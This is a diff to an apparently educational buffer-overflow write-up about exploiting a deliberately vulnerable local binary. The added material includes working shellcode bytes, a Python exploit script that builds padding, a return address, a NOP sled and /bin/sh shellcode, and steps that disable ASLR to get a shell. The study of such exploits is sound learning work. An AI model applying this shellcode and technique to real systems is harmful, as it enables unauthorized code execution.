@@ -391,10 +391,21 @@ Next is to add the memory address of the `buffer`.
 ```
 
 Thus, the final shellcode is `\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff`.
+We can store the shellcode to our `egg`
+
+```sh
+$ echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff" > egg
+```
 
 ## Documentation of Proofs
 
 To execute the exploit, run
+
+```
+(gdb) run < egg
+```
+
+or
 
 ```
 (gdb) run <<< $(echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff")
@@ -422,3 +433,147 @@ Nonetheless, this is a fun exercise and we have learned a lot from it.
 - [Phrack Volume 7 Issue 49: Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) for teaching us on smashing the stack
 - [Practical Binary Analysis](https://practicalbinaryanalysis.com/) for teaching assembly and basics of ELF
 - [Shell-Storm](https://shell-storm.org/shellcode/index.html) for providing shellcodes
+
+## Extra
+
+### Did you expect this?
+
+Writing a shellcode for exit status is quite boring.
+Why don't we pop a shell instead?
+Since it's annoying to use `echo` to generate our shellcode, we will be using our handy scripting language... Python!
+
+To pop a shell, we need a shellcode for it.
+Thankfully, we don't need to make one from scratch (because assembly is pain y'know) thanks to Shell-Storm.
+
+```
+\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+```
+
+This is probably at least 40 bytes long which does not fit inside the buffer's 8 byte size.
+
+Save the shellcode in Python and add the other stuffs as well
+
+```python
+OFFSET      = b"\x41"
+EIP         = b"\x18\xcd\xff\xff"
+NOP         = b"\x90"
+SHELLCODE   = b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+exploit     = OFFSET * 12 + EIP + NOP*4 + SHELLCODE
+
+print(exploit)
+```
+
+And that's it!
+Except this would not work because of how Python's `print()` function works.
+To prove this, we will compare echo's output against Python's output
+
+```sh
+$ echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x18\xcd\xff\xff\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" > eggshell
+$ xxd eggshell
+00000000: 4141 4141 4141 4141 4141 4141 18cd ffff  AAAAAAAAAAAA....
+00000010: 9090 9090 31c0 31db b006 cd80 5368 2f74  ....1.1.....Sh/t
+00000020: 7479 682f 6465 7689 e331 c966 b912 27b0  tyh/dev..1.f..'.
+00000030: 05cd 8031 c050 682f 2f73 6868 2f62 696e  ...1.Ph//shh/bin
+00000040: 89e3 5053 89e1 99b0 0bcd 80              ..PS.......
+
+$ python exploit2.py > eggshell2 && xxd eggshell2
+00000000: 6222 4141 4141 4141 4141 4141 4141 5c78  b"AAAAAAAAAAAA\x
+00000010: 3138 5c78 6364 5c78 6666 5c78 6666 5c78  18\xcd\xff\xff\x
+00000020: 3930 5c78 3930 5c78 3930 5c78 3930 315c  90\x90\x90\x901\
+00000030: 7863 3031 5c78 6462 5c78 6230 5c78 3036  xc01\xdb\xb0\x06
+00000040: 5c78 6364 5c78 3830 5368 2f74 7479 682f  \xcd\x80Sh/ttyh/
+00000050: 6465 765c 7838 395c 7865 3331 5c78 6339  dev\x89\xe31\xc9
+00000060: 665c 7862 395c 7831 3227 5c78 6230 5c78  f\xb9\x12'\xb0\x
+00000070: 3035 5c78 6364 5c78 3830 315c 7863 3050  05\xcd\x801\xc0P
+00000080: 682f 2f73 6868 2f62 696e 5c78 3839 5c78  h//shh/bin\x89\x
+00000090: 6533 5053 5c78 3839 5c78 6531 5c78 3939  e3PS\x89\xe1\x99
+000000a0: 5c78 6230 5c78 3062 5c78 6364 5c78 3830  \xb0\x0b\xcd\x80
+000000b0: 220a                                     ".
+
+$ sha256sum eggshell eggshell2
+b0200afddf57b3321ec88b73cddd7d7118fbac8cb8f9c8f781d3b1a0053367cd  eggshell
+2fb5cad2ba0574d4ac536518b463de6ed4846e8f4dfa635910b71d7c1cdcc757  eggshell2
+```
+
+As you can see, the raw bytes of Python's print output is a mess.
+The hash value are not the same.
+Hence, Python's print function should not be used
+This can be fixed by using a standard library output.
+
+The updated code is now
+
+```python
+import sys
+OFFSET      = b"\x41"
+EIP         = b"\x18\xcd\xff\xff"
+NOP         = b"\x90"
+SHELLCODE   = b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+exploit     = OFFSET * 12 + EIP + NOP*4 + SHELLCODE
+
+sys.stdout.buffer.write(exploit)
+```
+
+Checking it once again
+
+```sh
+$ python exploit2.py > eggshell2 && xxd eggshell2
+00000000: 4141 4141 4141 4141 4141 4141 18cd ffff  AAAAAAAAAAAA....
+00000010: 9090 9090 31c0 31db b006 cd80 5368 2f74  ....1.1.....Sh/t
+00000020: 7479 682f 6465 7689 e331 c966 b912 27b0  tyh/dev..1.f..'.
+00000030: 05cd 8031 c050 682f 2f73 6868 2f62 696e  ...1.Ph//shh/bin
+00000040: 89e3 5053 89e1 99b0 0bcd 80              ..PS.......
+
+$ sha256sum eggshell eggshell2
+b0200afddf57b3321ec88b73cddd7d7118fbac8cb8f9c8f781d3b1a0053367cd  eggshell
+b0200afddf57b3321ec88b73cddd7d7118fbac8cb8f9c8f781d3b1a0053367cd  eggshell2
+```
+
+Both shellcodes are now equal.
+
+Python can now be used to exploit the vulnerable binary
+
+```sh
+$ python exploit.py | ./vuln
+```
+
+This is done by piping Python's output to the input of the program.
+However, this would not work and would cause an illegal instruction error
+
+```sh
+[1]    1090485 done                              python exploit2.py |
+       1090486 segmentation fault (core dumped)  ./vuln
+```
+
+Because of ASLR randomizing the memory allocations everytime the program is ran.
+To disable ASLR without disabling the system's protection, one can do this
+
+```sh
+$ python exploit.py | setarch $(uname -m) -R ./vuln
+```
+
+This execution may or may not work as the memory addresses in GDB compared to being ran directly are different.
+This can be fixed by figuring out the exact memory address.
+There are many ways to do it but the simplest one that we have already done is through GDB and attaching GDB to the process of the program
+
+```sh
+$ setarch $(uname -m) -R ./vuln
+$ gdb -p <process id>
+```
+
+And if this does not work, we can use `gcore` to dump the current memory of a process id and manually find our input
+
+```sh
+$ gcore <process id>
+```
+
+Once the correct return address is acquired, we can now reran the exploit
+
+```python
+$ python exploit.py | setarch $(uname -m) -R ./vuln
+sh-5.2$ uname -a
+Linux NuclearChicken 6.7.4-arch1-1 #1 SMP PREEMPT_DYNAMIC Mon, 05 Feb 2024 22:07:49 +0000 x86_64 GNU/Linux
+```
+
+And we got a shell!
